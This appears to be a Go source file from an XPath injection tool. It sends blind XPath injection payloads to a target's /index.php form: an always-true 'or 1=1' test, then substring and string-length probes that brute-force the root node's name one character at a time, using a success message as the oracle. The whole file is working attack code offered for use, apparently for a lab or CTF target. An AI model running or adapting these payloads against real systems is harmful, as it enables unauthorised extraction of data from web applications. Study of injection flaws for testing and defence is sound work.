package exploit

import (
	"fmt"
	"strings"

	"github.com/letigredununavu/xpath-injection-tool/internal/httpclient"
)

func Test_BlindXPathInjection(target string) (bool, error) {

	payload := "username=test' or '1'='1&msg=test"
	contentType := "application/x-www-form-urlencoded"

	fmt.Println("[*] Sending test payload to see if vulnerable..")

	target = target + "/index.php"

	response, err := httpclient.SendPostRequest(target, payload, contentType)

	if err != nil {
		return false, fmt.Errorf("[-] Error sending the request : %v", err)
	}

	fmt.Println(response)

	successful := strings.Contains(response, "Message successfully sent!")

	length, err := FindNodeLength(target)

	if err != nil {
		return false, fmt.Errorf("[-] Error finding length : %v", err)
	}

	fmt.Println("[+] Length : ", length)

	node, err := FindLetters(target, length)

	if err != nil {
		return false, fmt.Errorf("[-] Error finding node value : %v", err)
	}

	fmt.Println("[+] node : ", node)

	return successful, nil
}

func FindLetters(target string, length int) (string, error) {
	alphabet := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-:{}@!$"
	contentType := "application/x-www-form-urlencoded"
	result := ""

	for i := 1; i <= length; i++ {
		fmt.Printf("[*] Finding character at position %d...\n", i)

		found := false
		for _, char := range alphabet {
			candidate := string(char)
			payload := fmt.Sprintf("username=invalid' or substring(name(/*[1]),%d,1)='%s' and '1'='1&msg=test", i, candidate)

			response, err := httpclient.SendPostRequest(target, payload, contentType)
			if err != nil {
				return "", fmt.Errorf("[-] Error sending request: %v", err)
			}

			if strings.Contains(response, "Message successfully sent!") {
				result += candidate
				fmt.Printf("[+] Found: %s (position %d)\n", candidate, i)
				found = true
				break
			}
		}

		if !found {
			return "", fmt.Errorf("[-] Could not determine character at position %d", i)
		}
	}

	return result, nil
}

func FindNodeLength(target string) (int, error) {
	length := 1
	payload := fmt.Sprintf("username=invalid' or string-length(name(/*[1]))=%d and '1'='1&msg=test", length)
	contentType := "application/x-www-form-urlencoded"

	response, err := httpclient.SendPostRequest(target, payload, contentType)

	if err != nil {
		return 0, fmt.Errorf("[-] Error sending the request : %v", err)
	}

	fmt.Println(response)
	length_found := strings.Contains(response, "Message successfully sent!")

	for {
		fmt.Println("[*] Trying length : ", length)
		if length_found {
			return length, nil
		}

		length++
		payload = fmt.Sprintf("username=invalid' or string-length(name(/*[1]))=%d and '1'='1&msg=test", length)
		response, err := httpclient.SendPostRequest(target, payload, contentType)

		if err != nil {
			return 0, fmt.Errorf("[-] Error sending the request : %v", err)
		}

		length_found = strings.Contains(response, "Message successfully sent!")
	}

}
